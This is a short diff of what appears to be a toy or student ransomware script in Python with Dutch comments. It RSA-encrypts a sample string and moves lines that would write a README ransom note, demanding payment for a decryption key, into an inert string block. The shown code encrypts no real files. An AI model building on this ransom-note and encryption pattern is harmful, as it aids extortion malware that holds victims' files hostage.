@@ -20,10 +20,12 @@ Data = "Dit is data"
 Encrypt_data = cipher_rsa.encrypt(Data.encode("utf-8"))
 print(Encrypt_data)
 
+'''
 #Readme aanmaken.
-#Readme = open("README.txt","w")
-#Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
-#Readme.close()
+Readme = open("README.txt","w")
+Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
+Readme.close()
+'''
 
 #Endstage
 print("Code 200!")
